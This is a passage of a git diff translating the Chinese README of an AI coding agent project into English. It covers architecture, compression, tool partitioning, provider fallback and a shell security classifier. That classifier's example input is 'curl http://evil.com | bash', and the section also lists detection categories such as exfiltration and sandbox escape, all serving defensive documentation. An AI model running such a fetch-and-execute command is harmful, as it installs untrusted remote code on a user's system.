@@ -1,423 +1,456 @@
 # OpenAGt
 
-> 基于 [OpenAGt](https://github.com/Yecyi/OpenAGt) 构建的增强型开源 AI 编程智能体，具备先进的上下文压缩、工具并发控制和 Flutter 移动端支持。
+> An enhanced open-source AI coding agent built on [OpenAGt](https://github.com/Yecyi/OpenAGt), featuring advanced context compression, tool concurrency control, and Flutter mobile client support.
 
 ---
 
-## 目录
+## Project Overview
 
-- [关于 OpenAGt](#关于-openagt)
-- [系统架构](#系统架构)
-  - [核心模块依赖图](#核心模块依赖图)
-- [核心算法详解](#核心算法详解)
-  - [三层渐进式压缩](#1-三层渐进式压缩)
-  - [工具并发分区](#2-工具并发分区)
-  - [Provider 降级链](#3-provider-降级链)
-  - [Shell 安全分析](#4-shell-安全分析)
-- [技术栈](#技术栈)
-- [项目结构](#项目结构)
-- [快速开始](#快速开始)
-  - [环境要求](#环境要求)
-  - [安装和运行](#安装和运行)
-  - [开发命令](#开发命令)
-- [核心类型系统](#核心类型系统)
-  - [MessageV2 结构](#messagev2-结构)
-  - [SyncEvent 事件溯源](#syncevent-事件溯源)
-- [扩展阅读](#扩展阅读)
-  - [详细技术分析](#详细技术分析)
-  - [包文档](#包文档)
-  - [核心模块文档](#核心模块文档)
-  - [设计系统](#设计系统)
-- [参考资料](#参考资料)
-- [许可证](#许可证)
-- [贡献指南](#贡献指南)
+OpenAGt is a research and open-source project that extends the upstream [OpenAGt](https://github.com/Yecyi/OpenAGt) by enhancing algorithms, improving scalability, and providing native mobile application support.
 
----
+**Core architectural features:**
 
-## 关于 OpenAGt
+- **Three-Layer Progressive Context Compression** — Inspired by Claude Code and Hermes Agent, reduces Token usage by 40–55% while preserving critical context
+- **Tool Concurrency Partitioning** — Parallel execution of safe/unsafe tools, reducing latency by 2–3x
+- **Provider Fallback Chain** — Automatic failover between LLM Providers (Anthropic, OpenAI, Google, etc.) on rate limits or errors
+- **Prompt Injection Protection** — Security scanning against adversarial instructions injected into context
+- **Flutter Mobile Client** — Native iOS/Android app for remote agent control
+- **Event Sourcing with SyncEvent** — Durable session sync supporting multi-device replay
+- **Effect Framework Architecture** — Functional dependency injection via Context/Layer for modular, testable services
+- **MCP & LSP Integration** — Model Context Protocol and Language Server Protocol support for rich tooling
 
-OpenAGt 是一个基于 [OpenAGt](https://github.com/Yecyi/OpenAGt) 的研究和开源项目，通过增强算法、改进可扩展性和原生移动应用支持扩展了原项目的功能。
+**Technology stack:**
 
-**相对于 OpenAGt 的主要增强：**
-
-- **三层渐进式压缩** — 灵感来自 Claude Code 和 Hermes Agent 的分层上下文管理，在保留关键信息的同时减少 40-55% 的 Token 使用量
-- **工具并发分区** — 安全/非安全工具的并行执行管理，延迟降低 2-3 倍
-- **Provider 降级链** — 在限流和服务出错时自动在 LLM Provider（Anthropic、OpenAI、Google 等）之间切换
-- **Prompt 注入防护** — 对上下文中文件的对抗性指令进行安全扫描
-- **Flutter 移动客户端** — 用于远程智能体控制的原生 iOS/Android 应用
-- **逾渗压缩** — Hermes 风格的核心成员特质，保留逾渗压缩的上下文
+| Layer | Technology |
+|-------|-----------|
+| Core Runtime | TypeScript + Bun |
+| Framework | Effect v4 (Functional Programming) |
+| AI SDK | Vercel AI SDK (25+ Providers) |
+| HTTP Server | Hono |
+| Database | SQLite (Drizzle ORM, WAL Mode) |
+| Web Framework | SolidJS |
+| Desktop | Tauri 2 + Electron |
+| Mobile | Flutter (planned) |
+| Protocol | ACP (Agent Communication Protocol) |
+| Event System | SyncEvent (Event Sourcing) |
 
 ---
 
-## 系统架构
+## Table of Contents
+
+- [About OpenAGt](#about-openagt)
+- [System Architecture](#system-architecture)
+  - [Core Module Dependency Graph](#core-module-dependency-graph)
+- [Core Algorithm Details](#core-algorithm-details)
+  - [1. Three-Layer Progressive Compression](#1-three-layer-progressive-compression)
+  - [2. Tool Concurrency Partitioning](#2-tool-concurrency-partitioning)
+  - [3. Provider Fallback Chain](#3-provider-fallback-chain)
+  - [4. Shell Security Analysis](#4-shell-security-analysis)
+- [Technology Stack](#technology-stack)
+- [Project Structure](#project-structure)
+- [Quick Start](#quick-start)
+  - [Environment Requirements](#environment-requirements)
+  - [Install and Run](#install-and-run)
+  - [Development Commands](#development-commands)
+- [Core Type System](#core-type-system)
+  - [MessageV2 Structure](#messagev2-structure)
+  - [SyncEvent Event Sourcing](#syncevent-event-sourcing)
+- [Extended Reading](#extended-reading)
+  - [Detailed Technical Analysis](#detailed-technical-analysis)
+  - [Package Documentation](#package-documentation)
+  - [Core Module Documentation](#core-module-documentation)
+  - [Design System](#design-system)
+- [References](#references)
+- [License](#license)
+- [Contributing](#contributing)
+
+---
+
+## About OpenAGt
+
+OpenAGt is a research and open-source project that builds on [OpenAGt](https://github.com/Yecyi/OpenAGt), extending the original project's capabilities through enhanced algorithms, improved scalability, and native mobile application support.
+
+**Key enhancements over OpenAGt:**
+
+- **Three-Layer Progressive Compression** — Layered context management inspired by Claude Code and Hermes Agent, reducing Token usage by 40–55% while preserving critical information
+- **Tool Concurrency Partitioning** — Safe/unsafe tool parallel execution management, reducing latency by 2–3x
+- **Provider Fallback Chain** — Automatic switching between LLM Providers (Anthropic, OpenAI, Google, etc.) on rate limits or server errors
+- **Prompt Injection Protection** — Security scanning against adversarial instructions in file contents and context
+- **Flutter Mobile Client** — Native iOS/Android app for remote agent control
+- **Percolation Compression** — Hermes-style core member trait that preserves percolation-compressed context
+
+---
+
+## System Architecture
 
 ```
 ┌─────────────────────────────────────────────────────────────────────────────┐
-│                           客户端层 (Clients)                             │
-│  ┌───────────┐  ┌───────────┐  ┌───────────┐  ┌───────────┐  ┌─────────┐ │
-│  │   TUI   │  │   Web   │  │Desktop  │  │Flutter  │  │  ACP   │ │
-│  │  (CLI)  │  │ (Solid) │  │ (Tauri) │  │ Mobile  │  │Protocol│ │
-│  └─────┬─────┘  └─────┬─────┘  └─────┬─────┘  └─────┬─────┘  └────┬────┘ │
-└────────┼───────────────┼───────────────┼───────────────┼─────────────┼────┘
-         │               │               │               │             │
-         └───────────────┴───────────────┴───────────────┘             │
-                              │                                       │
-                       HTTP + SSE / WebSocket                         │
-                              │                                       │
+│                           Client Layer (Clients)                            │
+│  ┌──────────┐  ┌──────────┐  ┌──────────┐  ┌──────────┐  ┌──────────┐ │
+│  │   TUI   │  │   Web   │  │ Desktop │  │ Flutter │  │  ACP   │ │
+│  │  (CLI)  │  │ (Solid) │  │ (Tauri) │  │  Mobile │  │Protocol│ │
+│  └────┬─────┘  └────┬─────┘  └────┬─────┘  └────┬─────┘  └────┬───┘ │
+└────────┼──────────────┼──────────────┼──────────────┼──────────────┼──────┘
+         └──────────────┴──────────────┴──────────────┴──────────────┘
+                              │
+                       HTTP + SSE / WebSocket
+                              │
 ┌─────────────────────────────────────────────────────────────────────────────┐
-│                   OpenAGt 服务端 (Hono + Effect Framework)              │
-│  ┌───────────┐  ┌───────────┐  ┌───────────┐  ┌───────────┐           │
-│  │ Session   │  │   Tool    │  │ Provider  │  │Compaction │           │
-│  │ Manager   │  │ Registry  │  │ Manager   │  │  Engine   │           │
-│  └─────┬─────┘  └─────┬─────┘  └─────┬─────┘  └─────┬─────┘           │
-│  ┌─────┴─────┐  ┌─────┴─────┐  ┌─────┴─────┐  ┌─────┴─────┐           │
-│  │   LSP     │  │   MCP     │  │Permission │  │   ACP     │           │
-│  │ Service   │  │ Manager   │  │  Engine   │  │ Protocol  │           │
-│  └─────┬─────┘  └─────┬─────┘  └─────┬─────┘  └─────┬─────┘           │
-│  ┌─────┴─────┐  ┌─────┴─────┐  ┌─────┴─────┐  ┌─────┴─────┐           │
-│  │   Bus     │  │ Sandbox   │  │  Config   │  │   Sync    │           │
-│  │ (PubSub)  │  │  Broker   │  │  Service  │  │  Event    │           │
-│  └───────────┘  └───────────┘  └───────────┘  └───────────┘           │
+│               OpenAGt Server (Hono + Effect Framework)                   │
+│  ┌──────────┐  ┌──────────┐  ┌──────────┐  ┌──────────┐            │
+│  │ Session  │  │   Tool   │  │ Provider │  │Compaction│            │
+│  │ Manager  │  │ Registry │  │ Manager  │  │  Engine  │            │
+│  └────┬─────┘  └────┬─────┘  └────┬─────┘  └────┬─────┘            │
+│  ┌────┴─────┐  ┌────┴─────┐  ┌────┴─────┐  ┌────┴─────┐            │
+│  │   LSP   │  │   MCP   │  │Permission│  │   ACP   │            │
+│  │ Service │  │ Manager │  │  Engine │  │ Protocol│            │
+│  └────┬─────┘  └────┬─────┘  └────┬─────┘  └────┬─────┘            │
+│  ┌────┴─────┐  ┌────┴─────┐  ┌────┴─────┐  ┌────┴─────┐            │
+│  │   Bus    │  │ Sandbox  │  │  Config  │  │   Sync   │            │
+│  │ (PubSub) │  │  Broker │  │  Service │  │  Event   │            │
+│  └──────────┘  └──────────┘  └──────────┘  └──────────┘            │
 └─────────────────────────────────────────────────────────────────────────────┘
                               │
                               │
 ┌─────────────────────────────────────────────────────────────────────────────┐
-│                   SQLite (WAL Mode) + File System                      │
-│  ┌───────────┐  ┌───────────┐  ┌───────────┐                        │
-│  │  Message  │  │  Session  │  │   Event   │                        │
-│  │   Table   │  │   Table   │  │ Sequence  │                        │
-│  └───────────┘  └───────────┘  └───────────┘                        │
+│                    SQLite (WAL Mode) + File System                        │
+│  ┌──────────┐  ┌──────────┐  ┌──────────┐                              │
+│  │  Message │  │  Session │  │  Event   │                              │
+│  │  Table   │  │  Table   │  │ Sequence │                              │
+│  └──────────┘  └──────────┘  └──────────┘                              │
 └─────────────────────────────────────────────────────────────────────────────┘
 ```
 
-### 核心模块依赖图
+### Core Module Dependency Graph
 
 ```
 ┌─────────────────────────────────────────────────────────────────────────────┐
-│                          Effect Framework                               │
-│  ┌─────────────────────────────────────────────────────────────────────┐ │
-│  │                   Runtime & Context System                        │ │
-│  │  ┌────────────────┐  ┌────────────────┐  ┌────────────────┐      │ │
-│  │  │ makeRuntime   │  │ InstanceState  │  │   MemoMap      │      │ │
-│  │  └────────────────┘  └────────────────┘  └────────────────┘      │ │
-│  └─────────────────────────────────────────────────────────────────────┘ │
-│                                    │                                      │
-│        ┌───────────────────────────┼───────────────────────────┐        │
-│        │                           │                           │        │
-│  ┌─────┴─────┐              ┌─────┴─────┐              ┌─────┴─────┐ │
-│  │ Provider  │              │  Session  │              │  Config   │ │
-│  │ Service   │              │  Service   │              │  Service  │ │
-│  │           │              │            │              │           │ │
-│  │┌─────────┐│              │┌─────────┐ │              │┌─────────┐ │ │
-│  ││25+ LLM  ││              ││MessageV2 │ │              ││ Agent   │ │ │
-│  ││Providers ││              ││Compaction│ │              ││ Config  │ │ │
-│  ││Fallback  ││              ││ Token    │ │              ││ Command │ │ │
-│  ││ Chain   ││              ││ Budget   │ │              ││ Model   │ │ │
-│  │└─────────┘│              │└─────────┘ │              │└─────────┘ │ │
-│  └───────────┘              └─────────────┘              └───────────┘ │
-│                                    │                                      │
-│                                    │                                      │
+│                         Effect Framework                                   │
+│  ┌──────────────────────────────────────────────────────────────────────┐ │
+│  │                  Runtime & Context System                          │ │
+│  │  ┌───────────────┐  ┌───────────────┐  ┌───────────────┐      │ │
+│  │  │ makeRuntime  │  │ InstanceState │  │   MemoMap     │      │ │
+│  │  └───────────────┘  └───────────────┘  └───────────────┘      │ │
+│  └──────────────────────────────────────────────────────────────────┘ │
+│                                    │                                     │
+│       ┌───────────────────────────┼───────────────────────────┐      │
+│       │                           │                           │      │
+│ �─────┴─────┐             ┌─────┴─────┐             ┌─────┴─────┐ │
+│ │  Provider  │             │  Session   │             │   Config   │ │
+│ │  Service   │             │  Service   │             │  Service   │ │
+│ │            │             │            │             │            │ │
+│ │┌─────────┐│             │┌─────────┐ │             │┌─────────┐ │ │
+│ ││25+ LLM ││             ││MessageV2│ │             ││ Agent   │ │ │
+│ ││Providers││             ││Compaction│ │             ││ Config  │ │ │
+│ ││Fallback ││             ││ Token   │ │             ││ Command │ │ │
+│ ││ Chain  ││             ││ Budget  │ │             ││ Model   │ │ │
+│ │└─────────┘│             │└─────────┘ │             │└─────────┘ │ │
+│ └───────────┘             └─────────────┘             └───────────┘ │
+│                                    │                                     │
 └────────────────────────────────────┼────────────────────────────────────┘
                                      │
-        ┌────────────────────────────┼────────────────────────────┐
-        │                            │                            │
-  ┌─────┴─────┐              ┌─────┴─────┐              ┌─────┴─────┐
-  │    Bus    │              │  Sandbox  │              │   Sync    │
-  │  (PubSub) │              │  Broker   │              │  Event    │
-  │           │              │           │              │  Sourcing  │
-  └───────────┘              └───────────┘              └───────────┘
-                                     │
+      ┌──────────────────────────────┼──────────────────────────────┐
+      │                              │                              │
+┌─────┴─────┐              ┌─────┴─────┐              ┌─────┴─────┐
+│    Bus     │              │  Sandbox   │              │   Sync    │
+│  (PubSub)  │              │  Broker   │              │  Event    │
+│            │              │           │              │  Sourcing  │
+└────────────┘              └───────────┘              └───────────┘
                                      │
 ┌────────────────────────────────────┼────────────────────────────────────┐
-│                          Tool Execution Layer                           │
+│                        Tool Execution Layer                             │
 │  ┌───────────┐              ┌───────────┐              ┌───────────┐ │
 │  │   Tool    │              │  Shell    │              │ Security  │
-│  │ Partition │              │ Security  │              │  Scanner  │
+│  │ Partition  │              │ Security  │              │  Scanner  │
 │  │           │              │           │              │           │
 │  │ Safe:     │              │┌─────────┐│              │┌─────────┐│ │
 │  │ read/grep/│              ││Command  ││              ││Injection││ │
-│  │ glob/webfetch│           ││Classifier││              ││Detection││ │
-│  │           │              ││风险评估 ││              ││ 沙箱    ││ │
-│  │ Unsafe:   │              │└─────────┘│              ││ 策略    ││ │
-│  │ bash/edit/│              │           │              │└─────────┘│ │
-│  │ write/task│              │           │              │           │ │
+│  │ glob/web  │              ││Classifier││              ││Detection││ │
+│  │ fetch     │              │└─────────┘│              │└─────────┘│ │
+│  │ Unsafe:   │              │           │              │           │
+│  │ bash/edit/│              │           │              │           │
+│  │ write/task│              │           │              │           │
 │  └───────────┘              └───────────┘              └───────────┘ │
 └─────────────────────────────────────────────────────────────────────────────┘
 ```
 
 ---
 
-## 核心算法详解
+## Core Algorithm Details
 
-### 1. 三层渐进式压缩
+### 1. Three-Layer Progressive Compression
 
 ```
-Token 使用量
+Token Usage
 │
-│ 100% ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─
+│ 100% ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─
 │
 │                                    ████████████████████████████
-│ 0%  ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─
+│ 0%  ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─
 │     Micro    Auto        Full          Blocking
 │     Compact  Compact     Compact       Limit
-│     ($0)     ($0)        (~$0.03-0.09)
-│     简单丢弃  内存瑶佺       LLM 摘要        阻断
+│     ($0)     ($0)       (~$0.03-0.09)
+│     Simple   Memory      LLM Summary
+│     discard  discard
 
-压缩优先线计算公式：
+Compression priority formula:
 priority = log(age_minutes + 1) × (11 - importance) + contentWeight × 0.5
 
-其中：
-- age_minutes: 工具结果距今分钟数的对数
-- importance: 工具重要性权重 (1-10, 10=最高)
-- contentWeight: 内容保留指数 (基于内容类型)
+Where:
+- age_minutes: logarithm of minutes since tool result
+- importance: tool importance weight (1–10, 10 = highest)
+- contentWeight: content retention exponent (based on content type)
 ```
 
-### 2. 工具并发分区
+### 2. Tool Concurrency Partitioning
 
 ```
-工具调用序列: [read, glob, edit, bash, grep, write]
+Tool call sequence: [read, glob, edit, bash, grep, write]
                       │
                       ▼
         ┌─────────────────────────┐
-        │     ToolPartition       │
-        │ partitionToolCalls()    │
+        │     ToolPartition        │
+        │ partitionToolCalls()     │
         └───────────┬─────────────┘
                     │
       ┌─────────────┴─────────────┐
       ▼                           ▼
-┌───────────┐              ┌───────────┐
-│Safe Batch │              │ Unsafe    │
-│(并行执行)  │              │(串行执行)  │
-│ ┌───────┐ │              │ ┌───────┐ │
-│ │read   │ │              │ │edit   │ │
-│ │glob   │ │              │ │bash   │ │
-│ │grep   │ │              │ │write  │ │
-│ │       │ │              │ │task   │ │
-│ └───────┘ │              │ └───────┘ │
-└───────────┘              └───────────┘
+┌─────────────┐            ┌─────────────┐
+│ Safe Batch  │            │   Unsafe    │
+│ (parallel)  │            │  (serial)   │
+│ ┌─────────┐ │            │ ┌─────────┐ │
+│ │ read    │ │            │ │ edit    │ │
+│ │ glob    │ │            │ │ bash    │ │
+│ │ grep    │ │            │ │ write   │ │
+│ └─────────┘ │            │ │ task    │ │
+└─────────────┘            └─────────────┘
 
-安全工具集: read, glob, grep, webfetch, codesearch, websearch, lsp, question, skill
-非安全工具集: bash, edit, write, task, todo, plan, apply_patch
+Safe tools: read, glob, grep, webfetch, codesearch, websearch, lsp, question, skill
+Unsafe tools: bash, edit, write, task, todo, plan, apply_patch, multiedit
 ```
 
-### 3. Provider 降级链
+### 3. Provider Fallback Chain
 
 ```
-请求 ──▶ anthropic/claude-sonnet-4
+Request ──▶ anthropic/claude-sonnet-4
               │
               │ 429 Rate Limit
               ▼
               openai/gpt-4o
               │                       │
-              │ 429 Rate Limit        │
+              │ 429 Rate Limit         │
               ▼                       ▼
               google/gemini-2.5-pro
               │                       │
-              │ 500 Server Error      │
+              │ 500 Server Error     │
               │                       ▼
-              │              可能再次降级
+              │              Possible further fallback
               │
               ▼
-              成功
+              Success
 
-降级决策逻辑：
-- 429 (Rate Limit): 立即降级
-- 500/502/503/504: 立即降级
-- 包含 "rate limit" 或 "overloaded" 的错误消息: 降级
-- 其他错误: 不降级
+Fallback decision logic:
+- 429 (Rate Limit): immediate fallback
+- 500/502/503/504: immediate fallback
+- Error message contains "rate limit" or "overloaded": fallback
+- Other errors: no fallback
 ```
 
-### 4. Shell 安全分析
+### 4. Shell Security Analysis
 
 ```
 ┌─────────────────────────────────────────────────────────────────────────────┐
-│                       Shell 命令安全分析流程                            │
+│                    Shell Command Security Analysis Flow                       │
 └─────────────────────────────────────────────────────────────────────────────┘
 
-输入命令: curl http://evil.com | bash
+Input command: curl http://evil.com | bash
                 │
                 ▼
         ┌──────────────────┐
         │  WrapperStripper │
-        │ 移除 wrapper (noglob, semicolons等) │
+        │ Remove wrappers (noglob, semicolons, etc.) │
         └────────┬─────────┘
                  │
                  ▼
         ┌──────────────────┐
         │ CommandClassifier │
-        │  正则模式匹配检测风险特征 │
+        │ Regex pattern matching for risk detection │
         │                   │
-        │  检测类别：        │
-        │  - injection (注入)                  │
-        │  - obfuscation (混淆)                │
-        │  - parse_integrity (解析完整性)        │
-        │  - interpreter_escalation (解释器升级) │
-        │  - filesystem_destruction (文件系统)   │
-        │  - network_exfiltration (网络渗出)     │
-        │  - sandbox_escape (沙箱逃逸)          │
-        │  - environment_hijack (环境劫持)      │
+        │ Detection categories:        │
+        │ - injection (injection attacks)                  │
+        │ - obfuscation (obfuscation)                │
+        │ - parse_integrity (parsing integrity)        │
+        │ - interpreter_escalation (interpreter escalation) │
+        │ - filesystem_destruction (filesystem destruction)   │
+        │ - network_exfiltration (network exfiltration)     │
+        │ - sandbox_escape (sandbox escape)          │
+        │ - environment_hijack (environment hijacking)      │
         └────────┬─────────┘
                  │
                  ▼
         ┌──────────────────┐
-        │  Risk Level      │
-        │  safe           │
-        │  low            │
-        │  medium  ─── shouldBlock() 检查
-        │  high           │
+        │   Risk Level      │
+        │   safe           │
+        │   low            │
+        │   medium ─── shouldBlock() check
+        │   high           │
         └────────┬─────────┘
                  │
                  ▼
         ┌──────────────────┐
-        │   Decision       │
-        │ allow  ──▶ 执行 │
-        │ confirm ──▶ 确认│
-        │ block  ──▶ 拒绝 │
+        │    Decision       │
+        │ allow ──▶ Execute │
+        │ confirm ──▶ Confirm│
+        │ block ──▶ Reject │
         └──────────────────┘
 ```
 
 ---
 
-## 技术栈
+## Technology Stack
 
-| 组件 | 技术 |
-|------|------|
-| 核心运行时 | TypeScript + Bun |
-| 框架 | Effect v4 (函数式编程) |
-| AI SDK | Vercel AI SDK (25+ providers) |
-| HTTP 服务端 | Hono |
-| 数据库 | SQLite (Drizzle ORM, WAL 模式) |
-| Web 框架 | SolidJS |
-| 桌面端 | Tauri 2 + Electron |
-| 移动端 | Flutter (计划中) |
-| 终端 UI | @opentui/core + SolidJS |
-| 协议 | ACP (Agent Communication Protocol) |
-| 事件系统 | SyncEvent (事件溯源) |
+| Component | Technology |
+|-----------|------------|
+| Core Runtime | TypeScript + Bun |
+| Framework | Effect v4 (Functional Programming) |
+| AI SDK | Vercel AI SDK (25+ Providers) |
+| HTTP Server | Hono |
+| Database | SQLite (Drizzle ORM, WAL Mode) |
+| Web Framework | SolidJS |
+| Desktop | Tauri 2 + Electron |
+| Mobile | Flutter (planned) |
+| Terminal UI | @opentui/core + SolidJS |
+| Protocol | ACP (Agent Communication Protocol) |
+| Event System | SyncEvent (Event Sourcing) |
 
 ---
 
-## 项目结构
+## Project Structure
 
 ```
 openag/
 ├── packages/
-│   ├── openagt/              # 核心智能体引擎
+│   ├── openagt/              # Core AI agent engine
 │   │   └── src/
-│   │       ├── session/       # 会话管理、消息、压缩
-│   │       │   ├── message-v2.ts    # 消息模型 (Part/Info 类型)
-│   │       │   ├── compaction/      # 三层压缩引擎
+│   │       ├── session/       # Session management, messages, compaction
+│   │       │   ├── message-v2.ts    # Message model (Part/Info types)
+│   │       │   ├── compaction/      # Three-layer compaction engine
 │   │       │   │   ├── auto.ts       # AutoCompact + CircuitBreaker
-│   │       │   │   ├── importance.ts  # 工具重要性计算
+│   │       │   │   ├── importance.ts  # Tool importance calculation
 │   │       │   │   └── ...
 │   │       │   └── session.ts        # Session Service
 │   │       │
-│   │       ├── provider/      # LLM Provider 管理
-│   │       │   ├── provider.ts # 25+ Provider 加载
-│   │       │   ├── fallback.ts  # 降级链逻辑
-│   │       │   ├── error.ts     # 错误类型解析
-│   │       │   └── schema.ts    # Provider/Model 类型定义
+│   │       ├── provider/      # LLM Provider management
+│   │       │   ├── provider.ts # 25+ Provider loading
+│   │       │   ├── fallback.ts  # Fallback chain logic
+│   │       │   ├── error.ts     # Error type parsing
+│   │       │   └── schema.ts    # Provider/Model type definitions
 │   │       │
-│   │       ├── tool/          # 工具系统
-│   │       │   ├── partition.ts # 并发安全分区
-│   │       │   ├── registry.ts  # 工具定义注册表
-│   │       │   └── truncate.ts  # 结果截断
+│   │       ├── tool/          # Tool system
+│   │       │   ├── partition.ts # Safe/unsafe concurrency partitioning
+│   │       │   ├── registry.ts  # Tool definition registry
+│   │       │   ├── truncate.ts  # Result truncation
+│   │       │   └── bash.ts, edit.ts, read.ts, glob.ts, grep.ts ...
 │   │       │
-│   │       ├── security/      # 安全防护
-│   │       │   ├── shell-security.ts  # Shell 命令分析
-│   │       │   ├── command-classifier.ts # 风险模式匹配
-│   │       │   └── wrapper-stripper.ts  # wrapper 移除
+│   │       ├── security/      # Security protection
+│   │       │   ├── shell-security.ts  # Shell command analysis
+│   │       │   ├── command-classifier.ts # Risk pattern matching
+│   │       │   ├── wrapper-stripper.ts  # Wrapper removal
+│   │       │   └── injection.ts   # Prompt injection detection
 │   │       │
-│   │       ├── bus/           # 事件总线 (PubSub)
-│   │       │   ├── index.ts    # Bus Service
-│   │       │   └── bus-event.ts # 事件定义
+│   │       ├── bus/           # Event bus (PubSub)
+│   │       │   ├── index.ts    # Bus Service + Layer
+│   │       │   ├── bus-event.ts # Event definitions
+│   │       │   └── global.ts    # GlobalBus cross-process events
 │   │       │
-│   │       ├── sync/          # 事件溯源
+│   │       ├── sync/          # Event sourcing
 │   │       │   └── index.ts   # SyncEvent.run/replay
 │   │       │
-│   │       ├── sandbox/       # 沙箱执行
-│   │       │   ├── broker.ts   # IPC Broker 进程管理
-│   │       │   ├── policy.ts   # 沙箱策略解析
-│   │       │   └── types.ts   # 类型定义
+│   │       ├── sandbox/       # Sandboxed execution
+│   │       │   ├── broker.ts   # IPC Broker process management
+│   │       │   ├── policy.ts   # Sandbox policy parsing
+│   │       │   └── types.ts   # Type definitions
 │   │       │
-│   │       ├── config/        # 配置管理
-│   │       │   ├── agent.ts   # Agent 配置
-│   │       │   ├── command.ts # 命令配置
-│   │       │   └── provider.ts # Provider 配置
-│   │       │
-│   │       ├── effect/        # Effect 框架扩展
-│   │       │   ├── run-service.ts  # makeRuntime
-│   │       │   ├── instance-state.ts # ScopedCache
-│   │       │   ├── memo-map.ts     # Layer 去重
+│   │       ├── config/        # Configuration management
+│   │       │   ├── agent.ts   # Agent config
+│   │       │   ├── provider.ts # Provider config
+│   │       │   ├── command.ts # Command config
 │   │       │   └── ...
 │   │       │
-│   │       ├── storage/       # 数据库
+│   │       ├── effect/        # Effect Framework extensions
+│   │       │   ├── run-service.ts  # makeRuntime
+│   │       │   ├── instance-state.ts # ScopedCache per instance
+│   │       │   ├── memo-map.ts     # Layer deduplication
+│   │       │   └── ...
+│   │       │
+│   │       ├── storage/       # SQLite database
 │   │       │   ├── schema.sql.ts   # Drizzle Schema
 │   │       │   └── index.ts        # Storage Service
 │   │       │
-│   │       ├── acp/           # ACP 协议
-│   │       ├── lsp/           # LSP 服务 (语言智能)
-│   │       ├── mcp/           # MCP 管理器 (Model Context Protocol)
-│   │       ├── permission/    # 权限引擎
+│   │       ├── acp/           # ACP protocol
+│   │       ├── lsp/           # LSP service (language intelligence)
+│   │       ├── mcp/           # MCP manager (Model Context Protocol)
+│   │       ├── permission/    # Permission engine
 │   │       └── ...
 │   │
-│   ├── app/                  # SolidJS Web 应用
-│   ├── desktop/              # Tauri 桌面应用
-│   ├── sdk/                  # 客户端 SDK
-│   ├── docs/                  # Mintlify 文档
-│   └── enterprise/            # 企业版
+│   ├── app/                  # SolidJS Web application
+│   ├── desktop/              # Tauri desktop application
+│   ├── sdk/                  # Client SDK
+│   ├── docs/                  # Mintlify documentation
+│   └── enterprise/            # Enterprise edition
 │
 ├── docs/
-│   └── TECHNICAL_ANALYSIS_REPORT.md  # 完整技术分析
+│   └── TECHNICAL_ANALYSIS_REPORT.md  # Full technical analysis
 │
 └── Code Reference/
-    ├── CC Source Code/   # Claude Code 参考实现
-    └── hermes-agent/     # Hermes Agent 参考
+    ├── CC Source Code/   # Claude Code reference implementation
+    └── hermes-agent/     # Hermes Agent reference
 ```
 
 ---
 
-## 快速开始
+## Quick Start
 
-### 环境要求
+### Environment Requirements
 
-- [Bun](https://bun.sh) 1.0+ 或 Node.js 20+
+- [Bun](https://bun.sh) 1.0+ or Node.js 20+
 - Git
 
-### 安装和运行
+### Install and Run
 
 ```bash
-# 克隆仓库
+# Clone the repository
 git clone https://github.com/Yecyi/OpenAGt.git
 cd OpenAGt
 
-# 安装依赖
+# Install dependencies
 bun install
 
-# 启动服务端
+# Start the server
 bun run dev
 
-# 在另一个终端启动 TUI
+# Start the TUI in another terminal
 bun run openag
 ```
 
-### 开发命令
+### Development Commands
 
 ```bash
-# 类型检查
+# Type checking
 bun typecheck
 
-# 代码检查
+# Linting
 bun lint
 
-# 运行测试 (从包目录运行)
+# Run tests (from package directory)
 bun test packages/openagt
 ```
 
 ---
 
-## 核心类型系统
+## Core Type System
 
-### MessageV2 结构
+### MessageV2 Structure
 
 ```
 Message
@@ -437,121 +470,122 @@ Message
 │   └── parentID, path, summary
 │
 └── Parts[]
-    ├── TextPart        # 文本内容
-    ├── ReasoningPart    # 推理过程
-    ├── ToolPart        # 工具调用
+    ├── TextPart        # Text content
+    ├── ReasoningPart    # Reasoning process
+    ├── ToolPart        # Tool call
     │   ├── status: pending | running | completed | error
     │   ├── callID, tool
     │   └── state: ToolState*
-    ├── FilePart        # 文件/媒体
-    ├── SnapshotPart    # 快照
-    ├── CompactionPart  # 压缩标记
-    └── StepFinishPart  # 步骤完成
+    ├── FilePart        # File/media
+    ├── SnapshotPart    # Snapshot
+    ├── CompactionPart  # Compaction marker
+    └── StepFinishPart  # Step completion
 ```
 
-### SyncEvent 事件溯源
+### SyncEvent Event Sourcing
 
 ```
 ┌─────────────────────────────────────────────────────────────────────────────┐
-│                   SyncEvent 定义                           │
+│                         SyncEvent Definition                                │
 └─────────────────────────────────────────────────────────────────────────────┘
 SyncEvent.define({
   type: "session.created",
   version: 1,
-  aggregate: "sessionID",  // 聚合根
+  aggregate: "sessionID",  // Aggregate root
   schema: z.object({ sessionID, info })
 })
                               │
                               ▼
 ┌─────────────────────────────────────────────────────────────────────────────┐
-│                   事件生命周期                               │
+│                         Event Lifecycle                                     │
 └─────────────────────────────────────────────────────────────────────────────┘
 SyncEvent.run(Created, data)
          │
          ▼
-Database.transaction (immediate)
+Database.transaction (IMMEDIATE)
          │
          ▼
-projector(db, data) ──▶ 状态变更
+projector(db, data) ──▶ State mutation
          │
          ▼
 EventSequenceTable ──▶ seq = last + 1
          │
          ▼
-EventTable ──▶ 持久化事件
+EventTable ──▶ Persist event
          │
          ▼
-Bus.publish ──▶ 事件通知
+Bus.publish ──▶ Global event notification
 ```
 
 ---
 
-## 扩展阅读
+## Extended Reading
 
-### 详细技术分析
+### Detailed Technical Analysis
 
-完整的架构、算法增强和 Flutter 可行性研究，请参考：
+For a complete architectural overview, algorithm enhancements, and Flutter feasibility study, refer to:
 
 - [docs/TECHNICAL_ANALYSIS_REPORT.md](./docs/TECHNICAL_ANALYSIS_REPORT.md)
 
-涵盖内容：
-- 架构比较 (OpenAGt vs Claude Code vs Hermes Agent)
